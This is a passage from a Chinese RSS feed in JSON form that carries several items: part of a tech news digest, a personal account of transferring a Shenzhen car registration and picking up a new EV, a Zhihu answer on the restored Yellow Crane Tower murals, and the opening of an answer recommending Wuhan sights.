英寸，笔记本将采用 Tensor 芯片，产品左右各具备一个 Type-C 接口，同时还有 3.5mm 耳机孔，预计会支持 PD 充电。笔记本的键盘采用了标准布局，同时具备触摸板、前置摄像头，开机按键位于键盘右上角。<a href=\"https://www.ithome.com/0/577/345.htm\" target=\"_blank\">来源</a>\n</li>\n<li>最新测试版 macOS Monterey 系统中包含了传闻中 14 英寸以及 16英寸 MacBook Pro 屏幕分辨率信息，系统中加入了对 3456 x 2234 Retina 和 3024 x 1964 Retina 的引用，但该分辨率并不属于当前任何一款 Mac，预计两款新机将采用性能更好的 M1X。<a href=\"https://www.theverge.com/2021/9/24/22691187/2021-m1x-macbook-pro-screen-resolution-3456-x-2234-retina-3024-x-1964\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<p> </p>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购<strong>八折</strong>优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>\n<a href=\"https://emojipedia.org/mobile-phone/\" target=\"_blank\">📱</a> 你有同时用两部手机的习惯或者经历吗？不妨去 <a href=\"https://sspai.com/bullet/1632293763\" target=\"_blank\">一派</a> 和大家聊聊你是怎么用它们。</li>\n<li>🦦 少数派「监工水獭」挂灯摆件 <a href=\"https://item.taobao.com/item.htm?id=656156847801\" target=\"_blank\">正式上架</a>，上新特惠 ￥49（原价 ￥69）。</li>\n<li>🎁 少数派会员增刊<a href=\"https://sspai.com/prime/precog/sp-0x00\" target=\"_blank\">《科技漫游》第〇期已经发布</a>，会员群、知识库同期上线，<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">现在购买</a> 可获赠价值 40 元的白描黄金版。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 继续进行中，数十款优质软件低至 5 折起。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2><strong>你可能错过的好文章</strong></h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68905\" target=\"_blank\">🔍 搜索排名靠前的网站一定给了钱？从 SEO 了解为什么你会看到这些网站</a></li>\n<li><a href=\"https://sspai.com/prime/story/oss-license-explained\" target=\"_blank\">💿 「自由」的边界——详解开源许可证</a></li>\n<li><a href=\"https://sspai.com/post/68959\" target=\"_blank\">🖥️ 和 Windows 更新打了这么多交道，这些事你可能还不知道</a></li>\n<li><a href=\"https://sspai.com/post/68962\" target=\"_blank\">🎞️ 本周看什么丨最近值得一看的 9 部作品</a></li>\n<li><a href=\"https://sspai.com/post/68950\" target=\"_blank\">📃 用 Figma 做一份个人简历</a></li>\n<li><a href=\"https://sspai.com/post/68921\" target=\"_blank\">🚗十天换车记：粤 B 蓝牌车转籍新能源，从新车预定到上牌开回家</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68985"},{"title":"十天换车记：粤 B 蓝牌车转籍新能源，从新车预定到上牌开回家","date":"2021-09-25 06:42:16","description":"\n<p>本文从 9 月 10 日到 9 月 20 日，总共十天的操作，重点记录在政府单位办理一个业务的过程，希望可以让有同样业务需求的朋友一定参考。</p>\n<p>这阵子我爸的车问题挺多要卖掉，他在老家上班又要用车，就要把我车转给他；然后我本来不着急换车，既然他要车了，在这节骨眼上我还是不得已要换。我和我爸都是蓝牌车，我是深圳车牌他是广西车牌。所以这次预计要折腾的是：</p>\n<ul>\n<li>我爸卖掉旧车（其实不需要我折腾）</li>\n<li>办理转籍把我的车转给我爸</li>\n<li>更新我的号牌指标</li>\n<li>买车</li>\n<li>上新能源牌照</li>\n</ul>\n<h2>Day 1 转籍申请、预订新车</h2>\n<p>9 月 10 日星期五，到深圳车管所了解程序，之前看知乎等别人写的攻略感觉都没用，根本不用那么麻烦。不用拆牌，不用寄档案，不用上临时牌，不用人肉把档案带回去。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae35b34te12vuoa0g.jpeg\"></figure><p>我感觉车管所大厅是深圳政府单位办事时舒适程度的天花板了。地方宽敞明亮、干净，沙发崭新舒服，空调很凉快。</p>\n<p>工作人员告诉我，车辆转出的业务要么网上预约，现在预约可能三个工作日内都没有号；要么直接在 App 申请，这个是最方便的。所以我直接在车管所大厅用 <strong>交管12123</strong> 直接操作了。</p>\n<h3>要点一：车辆转籍申请由转入方操作</h3>\n<span class=\"ss-application\" app-id=\"16166\"> </span><p>需要特别注意的是，这一步需要机动车购买方来操作，我一开始操作不了这个业务，当场询问工作人员之后才知道不是转出方操作的。把我爸的 App 帐户要过来登录操作：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae3db34te2nr88kg0.jpeg\"></figure><ol>\n<li>首页打开「更多」</li>\n<li>在业务中心点「搜索」栏</li>\n<li>搜索「机动车转籍申请」</li>\n<li>点「机动车所有人变化」</li>\n</ol>\n<h3>要点二：事先开好二手车销售统一发票</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae3lb34te2nr88kgg.jpeg\"></figure><p>在转籍申请的下一步，就是要填写上图的表格，其中有一栏是要上传「二手车销售统一发票」。注意在申请时有提示：<strong>转入地必须与二手车销售统一发票地一致</strong>。也就是说，需要在转入地开好销售发票。刚好我爸在老家附近可以开，花半小时办好，拍照过来，提交完毕。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae3tb34te2nr88kh0.jpeg\"></figure><p>提交后，申请进入左图「受理中」的状态，工作人员告诉我在深圳的事情就办完了，直接把车开回去，等两三个工作日办理完成，车子就可以在转入地重新入户了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae45b34te2hplttj0.png\"></figure><p>转籍的事办完，去商场看了下新车的颜色，交钱下单。</p>\n<h2>Day 2 开旧车回去</h2>\n<p>9 月 11 日星期六，回到老家，和开了七年的车说拜拜。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae4db34te12vuoa10.jpeg\"></figure><h2>Day 3 高铁回深圳</h2>\n<p>9 月 12 日星期天，打工人返回打工地。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae4db34te12vuoa1g.jpeg\"></figure><h2>Day 4 旧车入户、旧号牌转移迁出</h2>\n<p>9 月 13 日星期一，工作日了，这两天转籍申请的记录会有变动，要注意一下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae4lb34te2r9sas40.jpeg\"></figure><p>转籍不单是要让旧车在老家可以重新入户，也是要让粤B车牌指标可以更新，并且在新车使用这个指标，打开<strong>深圳市小汽车增量调控管理信息系统</strong>： http://xqctk.jtys.sz.gov.cn，选择「更新」登录。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae4tb34te2hplttjg.png\"></figure><p>我不记得有没有注册过。没关系，点「省政务网入口」，会跳转到「广东省统一身份认证平台」，这时用微信扫码，进行一道人脸识别认证就可以登录进去了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae55b34te2hplttk0.jpeg\"></figure><p>点击「我要申请」，填写申请表单，业务类型选择<strong>「转移迁出」</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae5tb34te12vuoa20.jpeg\"></figure><p>是这个状态就可以了。</p>\n<h2>Day 5 新车加快交付</h2>\n<p>9 月 14 日星期二，本来要三到五周的交付周期，理想销售和我说现在加快交付，有可能在中秋前提车。</p>\n<h2>Day 6 新车下线、付款</h2>\n<p>9 月 15 日星期三，销售通知车已经下线，如果付款，等五六天物流就到了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae65b34te2nr88khg.png\"><figcaption>好吧。</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae6db34te2nr88ki0.jpeg\"></figure><p>另外，转移迁出的申请也审核通过了，可以在政务服务网里下载 <strong>更新指标证明文件.pdf </strong>了。这个文件很重要，里面有个指标编号，新车在网上选号时要用到的。</p>\n<h2>Day 6~9</h2>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/09/22/4600192f7650b22bcdb58ee47d1b181b.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/22/8fa2cf4539f814216e3b5400282629b0.jpg\" alt=\"\"></figure><p>上班往来陪伴我的是哈啰单车和地铁的强冷车厢。</p>\n<p>这几天里，我爸也在老家办好了旧车的入户，旧车保险让车险的人转好了。</p>\n<p>第九天，理想销售让办保险，第二天带身份证来提车。</p>\n<h2>Day 10</h2>\n<p>9 月 20 日星期一，蹭老麦的 Model Y 来龙华交付中心提车，十几分钟办个临时牌就可以开走了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55ae75b34te2r9sas50.jpeg\"><figcaption>让交付小姐姐拍张露脐照</figcaption></figure><h2>后续</h2>\n<p>接下来要办的事，要用指标去选车牌，然后到罗湖车管所验车，车牌等一周多寄过来。这个过程可以自己跑，也可以给点钱让代办带着跑。最后自己去把旧车 ETC 改成新车绑定就完事。</p>\n<h2>总结</h2>\n<p>回顾我在深圳政府单位的办事过程，无论是小孩办证、房屋手续、车证业务，每次的感受都是差不多，那就是网上的信息是滞后的，但实际办事的效率会比看各种贴文攻略好不少。</p>\n<p>看其他网友写的东西，即使是一两年内的东西，会觉得太麻烦。如果到办事处去问，工作人员都会很友善耐心和你说，现在已经不需要 XXX 了，只需要在手机上怎样操作，可以节省很多时间和步骤。</p>\n<p>可以看出政府机关确实在办事上不断优化业务流程。至于网上五花八门的办事攻略，只要了解个大概就好，亲身到办事部门或电话去问一下是最高效的。</p>\n<p>注意：本文描述的这一次机动车转籍和提车的体验，其中办事流程只对应文章描述的日期，实际办理过程中可能会有其他情况，而新车交付过程的提前也是预料之外的。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68921"},{"title":"武汉黄鹤楼既然是新建的，游览价值是什么？","date":"2021-09-24 08:26:35","description":"\n<p><img src=\"https://pic1.zhimg.com/v2-7d841355331d79c203094e3bb9903e29_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1484\" data-watermark=\"original\" data-original-src=\"v2-7d841355331d79c203094e3bb9903e29\" data-watermark-src=\"v2-6255a91b54c94a3cc8e8f45f7169a223\" data-private-watermark-src=\"v2-99abe35b2d6a22210e5b13faa384dbdd\"></p>\n<p><br></p>\n<p>很多人去过黄鹤楼，大多数人登楼观景，但少有人见过壁画全貌。</p>\n<p><br></p>\n<p>6 个月前，黄鹤楼第五层的壁画开始修复。<b>这是自 1985 年以来，黄鹤楼壁画耗时最长、动工最大的一次修复。</b></p>\n<p><br></p>\n<p>9 月 13 日，修复结束，黄鹤楼第五层壁画将重新对外开放。</p>\n<p>赶在开放前，文旅君提前拜访了壁画作者，也是本次修复者楼家本先生，听他聊了聊，修复壁画那些事儿。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0cbf458fcfd05e0a5176c48b3319700d_720w.webp?rss\" data-caption=\"△ // 黄鹤楼最早建于近 1800 年前的三国时期，屡建屡毁。如今我们熟悉的黄鹤楼以清代同治年间的黄鹤楼为设计蓝本，建成于 1985 年。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-0cbf458fcfd05e0a5176c48b3319700d\" data-watermark-src=\"v2-290eab73e5bda4710bd198db54f88a71\" data-private-watermark-src=\"v2-ad6bc72b6ee026cfd9cdb1f2067fbf56\"></p>\n<p><br></p>\n<p><i><u><b>关于修复这件事儿 </b></u></i></p>\n<p><b><i><u>x</u></i></b></p>\n<p>1983 年，5 位中央美术学院的教授、艺术家受邀为黄鹤楼创作了 5 组壁画，分别位于黄鹤楼 1-5 层。</p>\n<p>一开始，5组壁画都计划采用传统壁画的手绘重彩，但考虑到武汉气候特殊，且黄鹤楼所在的蛇山两边是公路与铁路，火车过桥，烟雾会对楼内壁画产生影响。</p>\n<p>于是，放弃传统手法，1-4 层壁画都改用陶瓷等硬质材料完成，仅第5层的壁画，保留了手绘重彩。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3aaa5222cd30f7cac0c59d00d6db4cd9_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-3aaa5222cd30f7cac0c59d00d6db4cd9\" data-watermark-src=\"v2-a2b7b9b8a129efcb4322c912b767085e\" data-private-watermark-src=\"v2-9e54ae7e7a97c386bd22bc1e277449c4\"></p>\n<p><br></p>\n<p>即将完成修复的这组壁画，以《江天浩瀚》为主题，面积约 100 平方米，共十幅。当年由楼家本先生历经 4 年完成。</p>\n<p>正面墙上 3 幅分别以《流逝》、《浪淘沙》、《华年》表现长江文化以及黄鹤楼兴替过程，另绕大厅一周的7幅壁画统称为《长江源流》， 既气势恢宏，又饶有灵气，大自然在眼前徐徐铺展开来。</p>\n<p>36年岁月侵蚀，原有壁画模糊受潮需要修复，今年 3 月 26 日，77岁的楼家本先生受邀重回武汉，为这组壁画再赋生命。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f97a9f2c928ece5b79e0e15515bc0113_720w.webp?rss\" data-caption=\"△ // 楼家本先生退休前一直担任中央美术学院教授。1982 年，楼先生的国画作品“伎乐”作为国礼赠英国首相，BBC 还对他进行过专访。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-f97a9f2c928ece5b79e0e15515bc0113\" data-watermark-src=\"v2-317a0fa57fb763312a17c39fe27973b3\" data-private-watermark-src=\"v2-ee0be0cb603920dd1bf34ce78bf5d582\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-cf11d1bca771cfd8ce2203cc74eec8a7_720w.webp?rss\" data-caption=\"△ // 金壁重彩的绘画方式，采用天然矿植物颜料绘于墙上，颜色绚烂，线条有力，楼先生进行再创作时加入了自己新的注解，色彩更丰富和大胆。\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-cf11d1bca771cfd8ce2203cc74eec8a7\" data-watermark-src=\"v2-2bc5b3d0c322f7a4c984ea5975786f3a\" data-private-watermark-src=\"v2-d12c8a131f5f47ac486711c1eeca4800\"></p>\n<p><br></p>\n<p>修复后的壁画，色彩更鲜艳，细节更丰富。楼家本先生为《江天浩瀚》加入了新元素，就像彩蛋，只有盯着壁画细看，才会发现。</p>\n<p><br></p>\n<p><u><i><b>内行带你看壁画 </b></i></u></p>\n<p><u><i><b>x</b></i></u></p>\n<p>好在，这次有专业大神带路。</p>\n<p>《江天浩瀚》的 10 幅壁画讲了什么故事？楼先生把彩蛋埋在了哪里？文旅君抽丝剥茧说给你听。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-7515fe5e50663b1771333d9a1d7ccf79_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1466\" data-watermark=\"original\" data-original-src=\"v2-7515fe5e50663b1771333d9a1d7ccf79\" data-watermark-src=\"v2-53d245eef8693827bcd069e59cb8bfcf\" data-private-watermark-src=\"v2-578aa23a1c8fbb5ebbe7781cb272f389\"></p>\n<p><br></p>\n<p><b> 《流逝》</b></p>\n<p>壁画反映了黄鹤楼出珑之前的文化基础。</p>\n<p>第一阶段是创世纪时期，从武昌放鹰台、洪山老人桥、许家墩的彩陶，一直上溯白帝城附近的大溪文化。画面上出现洪荒时代大禹式的治水英雄和智慧聪敏的彩陶女。</p>\n<p>第二阶段是青铜器时代。在狞厉可畏的要餐纹、兽性的人面峨前，身披虎皮的举鼎奴隶充分显示了“有虔秉镶如火烈烈”。</p>\n<p>第三阶段是浪漫楚文化时期。湖北隋州出土的编钟及在楚乐声中翩翩起舞的楚女和行吟高亢“楚辞”的屈原式人物，是当时现实世界的一个缩影。</p>\n<p>长江养育了丰采照人的楚文化，黄鹤楼则是观照这文化的一个“望台”。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7d841355331d79c203094e3bb9903e29_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1484\" data-watermark=\"original\" data-original-src=\"v2-7d841355331d79c203094e3bb9903e29\" data-watermark-src=\"v2-6255a91b54c94a3cc8e8f45f7169a223\" data-private-watermark-src=\"v2-99abe35b2d6a22210e5b13faa384dbdd\"></p>\n<p><br></p>\n<p><b>《华年》</b></p>\n<p>壁画反映了三国初建黄鹤楼的历代兴废。</p>\n<p>画面上部是黄鹤楼初创时期工匠们辛勤劳动的场面，以李白、崔颢为代表的不朽诗篇，反映了黄鹤楼之盛期。三彩双龙尊色彩之流动，屏风的瑰丽将人带回盛唐之风采的境界中。</p>\n<p>画面正中，又出现明清黄鹤楼被水淹及战火谷噬的悲壮场面，向人们展示历经沧桑巨变的黄鹤楼。</p>\n<p>画面右下角，采桑女被刻画成性静朴美的江南少女形象。左下角一组男性船夫与惊涛骇浪作搏斗场面，代表中华民族的拼搏精神，以此作为这张“华年”画作的收尾。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-337a6ab28024266e9b7c6f27c6b0b02e_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"920\" data-watermark=\"original\" data-original-src=\"v2-337a6ab28024266e9b7c6f27c6b0b02e\" data-watermark-src=\"v2-01c021a3b85786b69d4bee8e7247bbcb\" data-private-watermark-src=\"v2-43dddb3072197607ed023f4909386b6d\"></p>\n<p><br></p>\n<p><b>《浪淘沙》</b></p>\n<p>中间最大幅壁画，以传统的孔雀石研制的石绿为基调，泼洒到巨大的墙面上，配合石青浓淡墨色、暖色使画面具有经过自然风化的青铜器的感觉。</p>\n<p>再用金勾勒出长江的涡漩激流，以一泻万里磅礴气势作为华夏民族历尽艰辛而百折不挠的精神写照。</p>\n<p><br></p>\n<p>/</p>\n<p><br></p>\n<p>接下来看的，是一组环绕大厅的7幅壁画《长江源流》，每段壁画由圆柱分割，表现了哺育着文化历史与思想的万里长江。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-06b3ac12afefb3ed3b44f24dd33ce2e0_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"974\" data-rawheight=\"852\" data-watermark=\"original\" data-original-src=\"v2-06b3ac12afefb3ed3b44f24dd33ce2e0\" data-watermark-src=\"v2-797fd4c5ed71969b2ef9911cfd43f36e\" data-private-watermark-src=\"v2-652a1b4f33386424aa2e738edb5c4e01\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b873aa2c43260361f41e499e66166bb2_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"2480\" data-watermark=\"original\" data-original-src=\"v2-b873aa2c43260361f41e499e66166bb2\" data-watermark-src=\"v2-10fd7a488e00b1129b0421c53489a612\" data-private-watermark-src=\"v2-c1762d9890a49153478b294ba86555f0\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c7406feb59fae3528de6ad3cf7d6eb97_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"2346\" data-watermark=\"original\" data-original-src=\"v2-c7406feb59fae3528de6ad3cf7d6eb97\" data-watermark-src=\"v2-18206917498119b2b4e56b46058c531a\" data-private-watermark-src=\"v2-1d8fd294eb284a1b3aaf692bb5822121\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1f80a249ec71b16d77246bc546b73924_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"3659\" data-watermark=\"original\" data-original-src=\"v2-1f80a249ec71b16d77246bc546b73924\" data-watermark-src=\"v2-0b85edadc8edad050ea8cec20526e1e5\" data-private-watermark-src=\"v2-4c1ad16e2e0ddca15b3f6e150bfeb94e\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d49e58347ce649e19ca21b1e09fdb17b_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"3609\" data-watermark=\"original\" data-original-src=\"v2-d49e58347ce649e19ca21b1e09fdb17b\" data-watermark-src=\"v2-84f5d5fd4054282e8b78652a7051028b\" data-private-watermark-src=\"v2-a453ba77e278960be96daaf9381aba77\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-6248c8c1fb2c38e0b8401c2e23939abb_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"2310\" data-watermark=\"original\" data-original-src=\"v2-6248c8c1fb2c38e0b8401c2e23939abb\" data-watermark-src=\"v2-70752ece54113bf8d24363318cef1764\" data-private-watermark-src=\"v2-621b73529e7b46f25072d75cdd56ecac\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ffdba8878d6fbf5a6b451839fbb18e2d_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"2328\" data-watermark=\"original\" data-original-src=\"v2-ffdba8878d6fbf5a6b451839fbb18e2d\" data-watermark-src=\"v2-62e895336e07260d7b0f04f91aaff91d\" data-private-watermark-src=\"v2-99e0654a3a9e71644f908e708818459f\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-45b064ea70f8f6c6a5c6a69cbf34f7b7_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"3734\" data-watermark=\"original\" data-original-src=\"v2-45b064ea70f8f6c6a5c6a69cbf34f7b7\" data-watermark-src=\"v2-39754d0d214ff1e5bccb43f536a2d901\" data-private-watermark-src=\"v2-ede985e9d14d414acb69e95657fbf86c\"></p>\n<p><br></p>\n<p><b>/</b></p>\n<p><br></p>\n<p>每一幅画都不是独立的，如果心细，可以发现很多呼应的地方。</p>\n<p>比如静美的采桑女和与海浪搏斗的船夫，比如红色的山头在两幅对立画中的呼应，比如前三幅一直连接的长江水……</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f0eaf3402818cd8115041e9e00d9a1db_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-f0eaf3402818cd8115041e9e00d9a1db\" data-watermark-src=\"v2-c022bab8097a8c22ade4149e997552ac\" data-private-watermark-src=\"v2-0dbdc8f26720277e1f4d5611b8a974a9\"></p>\n<p><br></p>\n<p>楼先生强调了他对艺术创作的态度，一定要“中化洋”，而不是“洋化中”，要留住自己文化的东西。</p>\n<p>纵观这组壁画，与黄鹤楼在建筑和历史文化上都很好融为一体，展现了中国壁画和中华文明的风采。</p>\n<p>但正如楼先生说，“这画不是句号，是逗号。”希望每个前来观看壁画的人，能够有自己的见解，壁画完成之后，它的生命就是被读者所延续。</p>\n<p><b>9 月 13 日，黄鹤楼第五层的壁画重新对外开放，欢迎你来看。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a099d355ba0ea009092f4d2651ca4940_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-a099d355ba0ea009092f4d2651ca4940\" data-watermark-src=\"v2-4f2a9dae97fc0505fb0662395e4b83a2\" data-private-watermark-src=\"v2-fa504b6d029d6fbe444fc2d8c7d59655\"></p>\n<p>*以上内容均为我司原创，并非抄袭，特此说明。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/hansyi-sheng-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">HANS汉声</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/463692637/answer/2133068485?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">214 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/485890062?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">武汉黄鹤楼背后有什么「不为人知」的故事？</a><br><a href=\"http://www.zhihu.com/question/337570929?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">去湖北武汉的「黄鹤楼」有哪些实用的攻略和好的建议？</a><br>\n","link":"http://www.zhihu.com/question/463692637/answer/2133068485?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"武汉有哪些著名景点值得推荐呢？","date":"2021-09-24 08:26:29","description":"\n<p>留几个字这里，有时间一定回答这个问题。</p>\n<p>上面一句是我好多天前敲的字。的确想回答一下这个问题。</p>\n<p>声明一下：文章有点长！追求短平快的，看到这里请放弃，网上另去搜索！别从头到尾读完了然后下面不礼貌评论。我可没拉着谁，请尊重我的劳动！</p>\n<p>旅游是我人生最爱，超过写作、读书、追剧、购物、聚会和美食……实际上旅游包括很多人人生爱好的一切，诸如吃喝玩乐衣食住行都可以涵括到“旅游”之内。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-eb10876fed40ae20b043f846a37828f6_720w.jpg?rss\" data-rawwidth=\"899\" data-rawheight=\"899\" data-size=\"normal\" data-caption=\"胡榴明在旅游途中——摄影黄樱子\" data-watermark=\"watermark\" data-original-src=\"v2-eb10876fed40ae20b043f846a37828f6\" data-watermark-src=\"v2-1e4e5fd82ed19a2faf313ba76a871396\" data-private-watermark-src=\"v2-d7ba4aa2eb6a08694e6d4ac3dcda199f\"></p>\n<p>外出旅游或旅行，第一奔景点，然后才是其他。没有好的自然风景古迹名胜吸引不了前来游玩的人。所以我们在选定了旅行目的地后接下来想要知道的就是当地最值得一游的景点，这样可以在有限的时间内力所能及玩得开心。所以有人上知乎提问并邀请人回答，尤其想听当地人的意见。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7b9863afa3168aae49bab82fef8d600e_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"2560\" data-size=\"normal\" data-caption=\"武汉二七长江大桥——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-7b9863afa3168aae49bab82fef8d600e\" data-watermark-src=\"v2-713b8879e48cef3cd20f527c42552043\" data-private-watermark-src=\"v2-aa2d1fbd019cd51e6d34ecb462155095\"></p>\n<p>一、节省自己上网攻略的时间和精力；二、获得较为可靠的信息免得前往景点吃（不必要的）亏——跑一个景点花了钱和力气觉得不值自然会有\"吃亏”的感觉，同为旅游（旅行）达人，这样心态我理解并深有感受。</p>\n<p>很高兴被邀请回答想来或准备来武汉旅游的人最关注的问题：武汉有哪些著名景点值得推荐的？</p>\n<p>多年前外地人来武汉，多数工作出差，然后顺带玩一下，专程为旅游来武汉的人很少，不拿武汉当旅游城。武汉本地人也一样，不以这样“形象”包装自己。(当年)不屑！包括我。</p>\n<p>从很小起，我一直想跑出武汉到别的地方去玩，从来不觉得自己生长的城市有什么好玩的。后来人长大了年纪老了，跑的地方多了，回过头来一想：武汉挺好！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-59b20c7fa88421ef79711db5396cb4e8_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"长江武汉一段——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-59b20c7fa88421ef79711db5396cb4e8\" data-watermark-src=\"v2-62fc0ae1a8cb223b1e5bd254423ba766\" data-private-watermark-src=\"v2-108a7ddbea8ffeced4497c13f847018e\"></p>\n<p>真不是“谁不说咱家乡好”。好就是好！不跟谁比。每一城市、每一风景旅游区，各有各的优点，各有各特别之处。要不然旅行者干嘛一年到头天南海北换着地方跑呢？</p>\n<p>去年十一去长沙，五一广场过去几条街人满为患，出租车路上堵得啊！司机蛮自豪：“网红城嘛！”听着心里挺疙瘩但不得不服气。谁叫咱武汉城市形象宣传力度没人家大没人家会呢！</p>\n<p>感想几句，下面回正题：</p>\n<p><img 